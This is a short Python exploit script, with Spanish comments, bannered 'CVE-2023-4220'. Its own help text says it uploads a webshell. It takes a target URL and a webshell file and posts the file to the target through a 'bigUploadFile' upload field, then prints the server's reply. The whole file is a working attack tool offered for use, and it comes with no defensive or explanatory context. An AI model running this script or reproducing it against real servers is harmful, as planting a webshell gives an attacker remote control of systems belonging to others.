import sys
import argparse
import requests
import signal
import pyfiglet

def banner():
    ascii_art = pyfiglet.figlet_format("CVE-2023-4220")
    print(ascii_art)
banner()

def def_handler(sig, frame):
    print(f"\n[!] Saliendo...")
    sys.exit(1)

# Manejo de interrupción (Ctrl+C)
signal.signal(signal.SIGINT, def_handler)

def main():
    parser = argparse.ArgumentParser(description="Este script sirve para subir una webshell")
    parser.add_argument('-u', '--url', type=str, required=True, help="URL a la que atacar")
    parser.add_argument('-f', '--file', type=str, required=True, help="Archivo con la webshell")

    args = parser.parse_args()

    # Abrir el archivo en modo binario
    archivo = args.file.split("/")[-1]  # Obtener el nombre del archivo
    with open(args.file, 'rb') as f:
        files = {'bigUploadFile': (archivo, f)}

        print(f"\n[+] Subiendo {archivo} a {args.url}...")

        # Enviar la solicitud POST para subir el archivo
        response = requests.post(args.url, files=files)

        # Manejo de la respuesta
        if response.status_code == 200:
            print(f"\n[+] Archivo subido exitosamente.")
            print(f"\n[+] Respuesta del servidor:")
            print(response.text)
        else:
            print(f"\n[!] Error al subir el archivo. Código de estado: {response.status_code}")
            print(f"\n[!] Respuesta del servidor:")
            print(response.text)

if __name__ == '__main__':
    main()

